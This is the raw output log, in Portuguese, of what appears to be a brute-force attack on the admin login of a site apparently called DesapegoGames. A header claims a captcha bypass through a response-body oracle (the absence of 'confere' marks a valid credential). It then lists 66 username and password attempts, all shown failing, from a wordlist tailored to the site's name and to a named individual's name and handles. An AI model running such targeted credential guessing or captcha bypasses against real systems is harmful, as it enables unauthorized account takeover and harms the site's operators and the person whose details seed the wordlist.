[*] admin login ORACULO brute — 26 users x 60 passes = 1560 tentativas
[*] Oraculo: body SEM 'confere' = cred certa (captcha bypass via ordem de validacao)
  [0001] 'administrador'          :'Desapego@2024'           -> HTTP 200 confere=True 
  [0002] 'administrador'          :'Desapego@2023'           -> HTTP 200 confere=True 
  [0003] 'administrador'          :'Desapego@2022'           -> HTTP 200 confere=True 
  [0004] 'administrador'          :'Desapego@2025'           -> HTTP 200 confere=True 
  [0005] 'administrador'          :'desapego2024'            -> HTTP 200 confere=True 
  [0006] 'administrador'          :'desapego2023'            -> HTTP 200 confere=True 
  [0007] 'administrador'          :'desapego123'             -> HTTP 200 confere=True 
  [0008] 'administrador'          :'Desapego123'             -> HTTP 200 confere=True 
  [0009] 'administrador'          :'DesapegoGames'           -> HTTP 200 confere=True 
  [0010] 'administrador'          :'desapegogames'           -> HTTP 200 confere=True 
  [0011] 'administrador'          :'Diego@2024'              -> HTTP 200 confere=True 
  [0012] 'administrador'          :'Diego@2023'              -> HTTP 200 confere=True 
  [0013] 'administrador'          :'diego123'                -> HTTP 200 confere=True 
  [0014] 'administrador'          :'Diego123'                -> HTTP 200 confere=True 
  [0015] 'administrador'          :'Diego2024'               -> HTTP 200 confere=True 
  [0016] 'administrador'          :'diego2024'               -> HTTP 200 confere=True 
  [0017] 'administrador'          :'diegobtrindade'          -> HTTP 200 confere=True 
  [0018] 'administrador'          :'Diego@2024!'             -> HTTP 200 confere=True 
  [0019] 'administrador'          :'Trindade123'             -> HTTP 200 confere=True 
  [0020] 'administrador'          :'trindade'                -> HTTP 200 confere=True 
  [0021] 'administrador'          :'Trindade@2024'           -> HTTP 200 confere=True 
  [0022] 'administrador'          :'admin'                   -> HTTP 200 confere=True 
  [0023] 'administrador'          :'admin123'                -> HTTP 200 confere=True 
  [0024] 'administrador'          :'Admin@123'               -> HTTP 200 confere=True 
  [0025] 'administrador'          :'Admin123'                -> HTTP 200 confere=True 
  [0026] 'administrador'          :'Admin@2024'              -> HTTP 200 confere=True 
  [0027] 'administrador'          :'adminv'                  -> HTTP 200 confere=True 
  [0028] 'administrador'          :'masterx'                 -> HTTP 200 confere=True 
  [0029] 'administrador'          :'masterx123'              -> HTTP 200 confere=True 
  [0030] 'administrador'          :'Masterx123'              -> HTTP 200 confere=True 
  [0031] 'administrador'          :'MasterX'                 -> HTTP 200 confere=True 
  [0032] 'administrador'          :'dev1ce'                  -> HTTP 200 confere=True 
  [0033] 'administrador'          :'Dev1ce123'               -> HTTP 200 confere=True 
  [0034] 'administrador'          :'devaashe'                -> HTTP 200 confere=True 
  [0035] 'administrador'          :'123456'                  -> HTTP 200 confere=True 
  [0036] 'administrador'          :'12345678'                -> HTTP 200 confere=True 
  [0037] 'administrador'          :'password'                -> HTTP 200 confere=True 
  [0038] 'administrador'          :'Password1'               -> HTTP 200 confere=True 
  [0039] 'administrador'          :'P@ssw0rd'                -> HTTP 200 confere=True 
  [0040] 'administrador'          :'qwerty'                  -> HTTP 200 confere=True 
  [0041] 'administrador'          :'abc123'                  -> HTTP 200 confere=True 
  [0042] 'administrador'          :'letmein'                 -> HTTP 200 confere=True 
  [0043] 'administrador'          :'welcome'                 -> HTTP 200 confere=True 
  [0044] 'administrador'          :'welcome1'                -> HTTP 200 confere=True 
  [0045] 'administrador'          :'DesapegoGames@2024'      -> HTTP 200 confere=True 
  [0046] 'administrador'          :'DesapegoGames123'        -> HTTP 200 confere=True 
  [0047] 'administrador'          :'desapegogames@2024'      -> HTTP 200 confere=True 
  [0048] 'administrador'          :'Desapego!2024'           -> HTTP 200 confere=True 
  [0049] 'administrador'          :'Desapego@2024!'          -> HTTP 200 confere=True 
  [0050] 'administrador'          :'Mudar@123'               -> HTTP 200 confere=True 
  [0051] 'administrador'          :'Senha@123'               -> HTTP 200 confere=True 
  [0052] 'administrador'          :'desapego!'               -> HTTP 200 confere=True 
  [0053] 'administrador'          :'Desapego2024'            -> HTTP 200 confere=True 
  [0054] 'administrador'          :'Desapego2023'            -> HTTP 200 confere=True 
  [0055] 'administrador'          :'desapego@2024'           -> HTTP 200 confere=True 
  [0056] 'administrador'          :'desapego@2025'           -> HTTP 200 confere=True 
  [0057] 'administrador'          :'Admin@desapego'          -> HTTP 200 confere=True 
  [0058] 'administrador'          :'Diego@desapego'          -> HTTP 200 confere=True 
  [0059] 'administrador'          :'masterx@2024'            -> HTTP 200 confere=True 
  [0060] 'administrador'          :'Masterx@2024'            -> HTTP 200 confere=True 
  [0061] 'adminv'                 :'Desapego@2024'           -> HTTP 200 confere=True 
  [0062] 'adminv'                 :'Desapego@2023'           -> HTTP 200 confere=True 
  [0063] 'adminv'                 :'Desapego@2022'           -> HTTP 200 confere=True 
  [0064] 'adminv'                 :'Desapego@2025'           -> HTTP 200 confere=True 
  [0065] 'adminv'                 :'desapego2024'            -> HTTP 200 confere=True 
  [0066] 'adminv'                 :'desapego2023'            -> HTTP 200 confere=True 
